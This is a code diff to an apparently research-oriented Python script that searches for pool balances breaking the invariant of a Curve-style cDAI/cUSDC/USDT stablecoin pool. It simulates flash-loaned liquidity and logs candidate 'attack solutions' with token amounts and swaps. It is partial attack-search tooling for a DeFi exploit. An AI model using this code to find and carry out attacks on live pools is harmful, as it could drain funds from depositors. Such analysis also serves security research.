@@ -245,18 +245,19 @@ def solutionFinder(s):
             write(str(s),"...")
         #To adapt for USDC and USDT
     print('Thread ended with seed.', s)
-N_THREADS = 10
-threads = []
-for t in range(0,N_THREADS):
-    x = threading.Thread(target=solutionFinder, args=(time.time(),))
-    time.sleep(0.1)
-    x.daemon=True
-    x.start()
-    threads.append(x)
-try:
-    while True: time.sleep(100)
-except (KeyboardInterrupt, SystemExit):
-    print('exit')
+if False:
+    N_THREADS = 10
+    threads = []
+    for t in range(0,N_THREADS):
+        x = threading.Thread(target=solutionFinder, args=(time.time(),))
+        time.sleep(0.1)
+        x.daemon=True
+        x.start()
+        threads.append(x)
+    try:
+        while True: time.sleep(100)
+    except (KeyboardInterrupt, SystemExit):
+        print('exit')
 
 #More sophisticated attack: 
 # 1/ Find balances in the pool such that we find a D that doesn't satisfy the equality of the invariant
@@ -286,18 +287,21 @@ while True:
     dai = cdai * rates[0] // PRECISION
     usdc = cusdc * rates[1] // PRECISION
     usdt = usdt
+    
+    perturb_dai  = randint(dai, dai  + funds_avail[0]*PRECISION//rates[0])
+    perturb_usdc = randint(usdc,usdc + funds_avail[1]*PRECISION//rates[1])
+    perturb_usdt = randint(usdt, usdt * rates[2] // PRECISION + funds_avail[2]*PRECISION//rates[2])
+    
     current_values_underlying = [dai, usdc, usdt * rates[2] // PRECISION]
     #Random perturbation to the pool composition between 1 and the funds available
-    perturb_dai = randint(0, funds_avail[0])
-    perturb_usdc = randint(0, funds_avail[1])
-    perturb_usdt = randint(0, funds_avail[2])
+
     #Add flash loaned liquidity to the pool
-    new_values_underlying = [dai+perturb_dai, usdc+perturb_usdc, usdt+perturb_usdt]
+    new_values_underlying = [perturb_dai, perturb_usdc, perturb_usdt]
     #Get D for this new pool composition
     D = solver.get_D(new_values_underlying, amp)
     #Check if the D found breaks the invariant
     u = USDTpool(new_values_underlying, amp, D)
-    if abs(u) > 0: 
+    if abs(u) > 0:
         #Convert new balances back to cTokens
         new_cdai = new_values_underlying[0] * PRECISION // rates[0]
         new_cusdc = new_values_underlying[1] * PRECISION // rates[1]
@@ -319,7 +323,7 @@ while True:
             file = open("D_based_attack_solutions.txt", "a")
             file.write("Amount of tokens to add: " + str(perturb_dai*PRECISION//rates[0]) + " cDAI, " + str(perturb_usdc*PRECISION//rates[1]) +  " cUSDC, " + str(perturb_usdt*PRECISION//rates[2]) + " USDT \n")
             file.write("Corresponding amount of underlying: " + str(perturb_dai) + " cDAI, " + str(perturb_usdc) +  " cUSDC, " + str(perturb_usdt) + " USDT \n")
-            file.write("Swap DAI for USDC. Amount to swap: " + str(amount_dai_in_underlying), "\n")
+            file.write("Swap DAI for USDC. Amount to swap: " + str(amount_dai_in_underlying)+ "\n")
             file.write("Effective exchange rate :" + str(amount_usdc_out_underlying/amount_dai_in_underlying) + "\n")
             file.write("Iteration " + str(iteration) + "\n \n")
             print("...")
